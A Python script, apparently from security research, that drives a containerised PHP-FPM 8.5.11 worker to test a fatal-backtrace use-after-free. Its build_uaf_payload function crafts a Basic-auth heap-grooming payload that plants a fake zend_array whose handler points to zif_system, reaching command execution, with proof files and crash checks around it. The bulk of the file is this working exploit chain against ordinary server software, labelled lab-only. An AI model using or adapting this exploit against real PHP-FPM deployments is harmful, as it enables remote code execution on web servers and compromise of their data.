#!/usr/bin/env python3
"""Phase 0/1 FPM driver for the PHP 8.5 fatal-backtrace path.

Lab-only. Drives a single-worker php-fpm with explicit FastCGI params, so the
pre-startup `PHP_VALUE`/`PHP_ADMIN_VALUE` window can be measured.

Reuses the Apache driver's log parsers.
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import shutil
import struct
import sys
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path

PROJECT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT / "src"))
sys.path.insert(0, str(PROJECT / "research"))

import fcgi_client  # noqa: E402
import phase0_85 as p0  # noqa: E402

VULN85 = "php2shell:8.5.11-fpm-debug"
FIXED85 = "php2shell:8.5.12-fpm-debug"
CSS = "id > /out/rce85-fpm-instrumented-proof"


def free_port() -> int:
    import socket
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


FPM_CONF = """\
[global]
daemonize = no
error_log = /proc/self/fd/2
log_level = notice
pid = /tmp/php-fpm.pid

[www]
user = www-data
group = www-data
listen = 0.0.0.0:9000
pm = static
pm.max_children = 1
pm.max_requests = 0
clear_env = no
catch_workers_output = yes
access.log = /proc/self/fd/2
php_admin_value[error_log] = /proc/self/fd/2
php_admin_flag[log_errors] = on
"""


@dataclass
class FpmLab:
    image: str
    run_dir: Path
    fatal: int = 1
    mode: str = "log"
    command: str = CSS
    name: str = field(default_factory=lambda: "p2s85fpm-" + uuid.uuid4().hex[:8])
    port: int = field(default_factory=free_port)

    @property
    def out_dir(self) -> Path:
        return self.run_dir / "out"

    def start(self) -> None:
        self.out_dir.mkdir(parents=True, exist_ok=True)
        (self.run_dir / "zz-backtrace.ini").write_text(
            "fatal_error_backtraces = %d\nzend.exception_ignore_args = 0\n" % self.fatal
        )
        (self.run_dir / "php-fpm.conf").write_text(FPM_CONF)
        p0.sh(["docker", "rm", "-f", self.name], check=False)
        args = [
            "docker", "run", "-d", "--name", self.name,
            "--platform", "linux/amd64",
            "--memory", "1g", "--memory-swap", "1g", "--cpus", "2",
            "--security-opt", "no-new-privileges:true",
            "-e", "P2S85_EXT_MODE=%s" % self.mode,
            "-e", "P2S85_CMD=%s" % self.command,
            "-p", "127.0.0.1:%d:9000" % self.port,
            "-v", "%s:/var/www/html:ro" % (PROJECT / "docker" / "www"),
            "-v", "%s:/usr/local/etc/php/conf.d/zz-lab.ini:ro"
                  % (PROJECT / "docker" / "php-lab.ini"),
            "-v", "%s:/usr/local/etc/php/conf.d/zz-backtrace.ini:ro"
                  % (self.run_dir / "zz-backtrace.ini"),
            "-v", "%s:/usr/local/etc/php-fpm.conf:ro" % (self.run_dir / "php-fpm.conf"),
            "-v", "%s:/out" % self.out_dir,
            self.image,
            "/bin/sh", "-c",
            "cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini; "
            "chown -R www-data:www-data /out; exec php-fpm -F -y /usr/local/etc/php-fpm.conf",
        ]
        p0.sh(args)
        deadline = time.monotonic() + 60
        while time.monotonic() < deadline:
            try:
                response = self.fcgi("/index.php")
                if response.status in (200, None) and b"OK" in response.body:
                    return
            except OSError:
                pass
            time.sleep(0.2)
        raise RuntimeError("FPM target did not become ready: %s"
                           % p0.sh(["docker", "logs", "--tail", "30", self.name],
                                   check=False).stderr)

    def fcgi(self, uri: str, extra: dict[bytes, bytes] | None = None,
             body: bytes = b""):
        path = uri.split("?", 1)[0]
        params = fcgi_client.base_params(
            ("/var/www/html" + path).encode(),
            uri.encode(),
            uri.split("?", 1)[1].encode() if "?" in uri else b"",
        )
        if extra:
            params.update(extra)
        return fcgi_client.request("127.0.0.1", self.port, params, body=body)

    def worker_pids(self) -> list[int]:
        result = p0.sh(["docker", "exec", self.name, "ps", "-eo", "pid=,ppid=,cmd="],
                       check=False)
        pids = []
        for line in result.stdout.splitlines():
            fields = line.split(None, 2)
            if len(fields) >= 3 and "php-fpm" in fields[2] and fields[1] != "0":
                try:
                    pids.append(int(fields[0]))
                except ValueError:
                    pass
        return pids

    def stop(self) -> None:
        p0.sh(["docker", "rm", "-f", self.name], check=False)


def parse_rinit(path: Path) -> dict:
    """Consumer-side RINIT record plus the stale-slot bytes seen at RINIT."""
    text = path.read_text(errors="replace") if path.exists() else ""
    records: list[dict] = []
    current = None
    for line in text.splitlines():
        m = re.match(r"-- RINIT pid=\d+ uri=(\S+) stale=(\S+) "
                     r"auth_user=(\S+) auth_pass=(\S+) path=(\S+)", line)
        if m:
            try:
                auth = int(m.group(3), 0)
            except ValueError:
                auth = 0
            try:
                stale = int(m.group(2), 0)
            except ValueError:
                stale = 0
            current = {"uri": m.group(1), "stale": stale,
                       "auth_user": auth}
            records.append(current)
            continue
        m = re.match(r"-- RINIT pid=\d+ uri=(\S+) stale=(\S+)", line)
        if m:
            try:
                stale = int(m.group(2), 0)
            except ValueError:
                stale = 0
            current = {"uri": m.group(1), "stale": stale}
            records.append(current)
            continue
        if current is not None and line.startswith("rinit_stale  +"):
            current.setdefault("_hex", []).extend(
                int(x, 16) for x in line.split(":", 1)[1].split())
            if len(current["_hex"]) >= 64:
                current["stale_header"] = bytes(current.pop("_hex")[:64])
        m = re.match(r"rinit zval=(0x[0-9a-f]+) type=(\d+)", line)
        if m and current is not None:
            current["zval"] = int(m.group(1), 16)
            current["type"] = int(m.group(2))
    for record in records:
        if "/consumer/index.php" in record["uri"]:
            return record
    return records[-1] if records else {}


def _p32(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into("<I", buf, off, value)


def _p64(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into("<Q", buf, off, value)


def build_uaf_payload(slot: int, base: int, length: int, zif: int,
                      command: bytes) -> bytes:
    """Place a fake zend_array at `slot` inside a large Basic-auth string.

    The decoded `user` zend_string starts at `base`; its data starts at
    base+0x18. The stale zval points at `slot`, so the fake header is written
    at slot-(base+0x18). The execute_data/string live later in the same block.
    """
    data_base = base + 0x18
    fake = slot - data_base
    ar = slot + 0xB0
    st = slot + 0x130
    if fake < 2 or ar - data_base + 0x100 > length:
        raise ValueError("payload too short for fake header/execute data")
    if st - data_base + 0x18 + len(command) + 1 > length:
        raise ValueError("payload too short for command string")

    buf = bytearray(length)
    buf[0] = ord(":")   # php_handle_auth_data strchr() finds this
    buf[1] = 0          # avoid a huge auth_password allocation

    _p32(buf, fake + 0x00, 1)           # gc.refcount
    _p32(buf, fake + 0x04, 7)           # gc.type = IS_ARRAY
    _p32(buf, fake + 0x08, 0x10)        # HASH_FLAG_STATIC_KEYS
    _p32(buf, fake + 0x0c, 0xFFFFFFF8)  # nTableMask
    _p64(buf, fake + 0x10, ar)          # arData -> fake execute_data
    _p32(buf, fake + 0x18, 1)           # nNumUsed
    _p32(buf, fake + 0x1c, 1)           # nNumOfElements
    _p32(buf, fake + 0x20, 8)           # nTableSize
    _p32(buf, fake + 0x24, 0)           # nInternalPointer
    _p64(buf, fake + 0x28, 0)           # nNextFreeElement
    _p64(buf, fake + 0x30, zif)         # pDestructor

    e = ar - data_base
    _p64(buf, e + 0x10, zif)            # fake internal function handler
    _p32(buf, e + 0x2c, 1)
    _p64(buf, e + 0x50, st)             # arg zval value -> fake string
    _p32(buf, e + 0x58, 6)              # arg zval type = IS_STRING

    stbuf = st - data_base
    _p32(buf, stbuf + 0x00, 1)
    _p32(buf, stbuf + 0x04, 0x0106)
    _p64(buf, stbuf + 0x10, len(command))
    buf[stbuf + 0x18:stbuf + 0x18 + len(command)] = command
    buf[stbuf + 0x18 + len(command)] = 0
    return bytes(buf)


def one_run(args, image: str, label: str, index: int) -> dict:
    run_dir = Path(args.evidence).resolve() / ("%s-%02d" % (label, index))
    if run_dir.exists():
        shutil.rmtree(run_dir)
    lab = FpmLab(image=image, run_dir=run_dir, fatal=args.fatal, mode=args.mode,
                 command=args.command)
    record = {"image": image, "label": label, "run": index, "fatal": args.fatal,
              "mode": args.mode, "sapi": "fpm", "php_value": args.php_value,
              "evidence": str(run_dir)}
    try:
        lab.start()
        record["workers_before"] = lab.worker_pids()
        health = lab.fcgi("/index.php")
        (run_dir / "health.resp").write_bytes(health.stdout)
        record["health_status"] = health.status

        if args.producer_warmup:
            try:
                warm = lab.fcgi(args.producer_warmup)
                record["warmup_status"] = warm.status
            except OSError as exc:
                record["warmup_error"] = repr(exc)
            time.sleep(0.2)
        producer_extra = {}
        if args.producer_php_value:
            producer_extra[b"PHP_VALUE"] = args.producer_php_value.encode()
        if args.producer_auth_hex:
            producer_extra[b"HTTP_AUTHORIZATION"] = (
                b"Basic " + base64.b64encode(bytes.fromhex(args.producer_auth_hex)))
        try:
            producer = lab.fcgi(args.producer, extra=producer_extra)
            (run_dir / "fatal.resp").write_bytes(
                producer.stdout + b"\n--STDERR--\n" + producer.stderr)
            record["producer_status"] = producer.status
        except OSError as exc:
            record["producer_error"] = repr(exc)
            (run_dir / "fatal.resp").write_text(record["producer_error"] + "\n")
        time.sleep(0.4)
        record["producer"] = p0.parse_extension_log(lab.out_dir / "p2s85-probe.log")
        ext_text = (lab.out_dir / "p2s85-probe.log").read_text(errors="replace") \
            if (lab.out_dir / "p2s85-probe.log").exists() else ""
        record["zif_line"] = next((ln for ln in ext_text.splitlines()
                                   if ln.startswith("== ZIF_SYSTEM")), None)
        zif = None
        if record["zif_line"] and "handler=0x" in record["zif_line"]:
            zif = int(record["zif_line"].split("handler=")[1].split()[0], 16)

        extra = {}
        if args.php_value:
            extra[b"PHP_VALUE"] = args.php_value.encode()
        if args.php_admin_value:
            extra[b"PHP_ADMIN_VALUE"] = args.php_admin_value.encode()
        if args.uaf:
            if zif is None:
                raise RuntimeError("no zif_system handler in the producer log")
            payload = build_uaf_payload(args.uaf_slot, args.uaf_base, args.uaf_len,
                                        zif, args.uaf_command.encode())
            extra[b"HTTP_AUTHORIZATION"] = b"Basic " + base64.b64encode(payload)
            record["uaf"] = {"slot": hex(args.uaf_slot), "base": hex(args.uaf_base),
                             "len": args.uaf_len, "zif": hex(zif),
                             "b64_len": len(extra[b"HTTP_AUTHORIZATION"])}
        elif args.auth_payload_hex:
            extra[b"HTTP_AUTHORIZATION"] = (
                b"Basic " + base64.b64encode(bytes.fromhex(args.auth_payload_hex)))
        if args.script_filename:
            extra[b"SCRIPT_FILENAME"] = args.script_filename.encode()
            extra[b"SCRIPT_NAME"] = b"/index.php"
            extra[b"DOCUMENT_URI"] = b"/index.php"
            extra[b"REQUEST_URI"] = b"/index.php"
        try:
            consumer = lab.fcgi("/consumer/index.php", extra=extra)
            (run_dir / "consumer.resp").write_bytes(
                consumer.stdout + b"\n--STDERR--\n" + consumer.stderr)
            record["consumer_status"] = consumer.status
            record["consumer_stderr"] = consumer.stderr.decode("latin1", "replace")[-2000:]
        except OSError as exc:
            record["consumer_error"] = repr(exc)
            (run_dir / "consumer.resp").write_text(record["consumer_error"] + "\n")
        time.sleep(0.6)
        record["consumer"] = parse_rinit(lab.out_dir / "p2s85-probe.log")
        record["consumer_type"] = record["consumer"].get("type")

        record["proof"] = None
        for proof_name in ("rce85-fpm-instrumented-proof", "rce85-fpm-uaf-proof"):
            proof = lab.out_dir / proof_name
            if proof.exists():
                record["proof"] = proof.read_text().strip()
                break
        record["workers_after"] = lab.worker_pids()
        record["worker_replaced"] = bool(record["workers_before"]) and (
            record["workers_before"] != record["workers_after"])
        tail = p0.sh(["docker", "logs", "--tail", "40", lab.name], check=False)
        record["fpm_tail"] = ((tail.stdout or "") + (tail.stderr or ""))[-8000:]
        record["crash_marker"] = any(m in record["fpm_tail"] for m in
                                     ("exited on signal", "SIGSEGV", "SIGABRT",
                                      "zend_mm_heap corrupted"))
        ext_text = (lab.out_dir / "p2s85-probe.log").read_text(errors="replace") \
            if (lab.out_dir / "p2s85-probe.log").exists() else ""
        record["alloc_events"] = [ln for ln in ext_text.splitlines()
                                  if "installed fake array" in ln or "cleared stale zval" in ln]
        record["healthy"] = False
        try:
            health_after = lab.fcgi("/index.php")
            record["healthy"] = (health_after.status in (200, None)
                                 and b"OK" in health_after.body)
        except OSError:
            pass
    finally:
        if not args.keep:
            lab.stop()
        else:
            record["container"] = lab.name
    (run_dir / "run.json").write_text(json.dumps(record, indent=2, default=str) + "\n")
    return record


def summarize(records: list[dict]) -> dict:
    offsets = [r.get("producer", {}).get("offset") for r in records]
    frames = [r.get("producer", {}).get("frame_offset") for r in records]
    args = [r.get("producer", {}).get("args_offset") for r in records]
    return {
        "runs": len(records),
        "sapi": "fpm",
        "top_level_offsets": [hex(o) if o is not None else None for o in offsets],
        "frame_offsets": [hex(o) if o is not None else None for o in frames],
        "args_offsets": [hex(o) if o is not None else None for o in args],
        "stable_top_level": len(set(offsets)) == 1 and offsets[0] is not None,
        "consumer_types": [r.get("consumer_type") for r in records],
        "proofs": [r.get("proof") for r in records],
        "worker_replaced": [r.get("worker_replaced") for r in records],
        "crash_marker": [r.get("crash_marker") for r in records],
        "healthy_after": [r.get("healthy") for r in records],
        "zif_lines": [r.get("zif_line") for r in records],
        "slot_headers": [ (r.get("consumer", {}).get("stale_header") or b"").hex()
                          for r in records],
        "auth_user": [r.get("consumer", {}).get("auth_user") for r in records],
        "slot_address": [hex(r.get("consumer", {}).get("stale", 0))
                         if r.get("consumer", {}).get("stale") else None
                         for r in records],
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--image", default=VULN85)
    parser.add_argument("--mode", choices=("log", "clear", "fake"), default="log")
    parser.add_argument("--fatal", type=int, choices=(0, 1), default=1)
    parser.add_argument("--runs", type=int, default=1)
    parser.add_argument("--label", default=None)
    parser.add_argument("--evidence", default=str(PROJECT / "out" / "test85" / "fpm"))
    parser.add_argument("--keep", action="store_true")
    parser.add_argument("--command", default=CSS)
    parser.add_argument("--php-value", default="memory_limit=999999999999999999999")
    parser.add_argument("--php-admin-value", default="")
    parser.add_argument("--producer", default="/fatal.php?mode=user_error",
                        help="producer URI (early-fatal groom experiments)")
    parser.add_argument("--producer-warmup", default="",
                        help="URI requested before the producer (opcache warm-up)")
    parser.add_argument("--producer-php-value", default="",
                        help="PHP_VALUE for the producer request (startup OOM groom)")
    parser.add_argument("--producer-auth-hex", default="",
                        help="decoded Basic auth for the producer (56-bin pre-startup groom)")
    parser.add_argument("--uaf", action="store_true",
                        help="large Basic-auth UAF groom (fake array in freed user string)")
    parser.add_argument("--uaf-slot", type=lambda v: int(v, 0), default=0x400645c150)
    parser.add_argument("--uaf-base", type=lambda v: int(v, 0), default=0x4006404000)
    parser.add_argument("--uaf-len", type=lambda v: int(v, 0), default=0x58400)
    parser.add_argument("--uaf-command", default="id > /out/rce85-fpm-uaf-proof")
    parser.add_argument("--auth-payload-hex", default="",
                        help="decoded Basic-auth payload, hex")
    parser.add_argument("--script-filename", default="",
                        help="override SCRIPT_FILENAME (path-length grooming)")
    args = parser.parse_args()

    label = args.label or ("%s-%s-fatal%d" % (
        ("fpm-vuln" if "8.5.11" in args.image else "fpm-fixed"), args.mode, args.fatal))
    records = [one_run(args, args.image, label, i + 1) for i in range(args.runs)]
    summary = summarize(records)
    root = Path(args.evidence).resolve()
    root.mkdir(parents=True, exist_ok=True)
    (root / (label + ".json")).write_text(
        json.dumps({"summary": summary, "runs": records}, indent=2, default=str) + "\n")
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
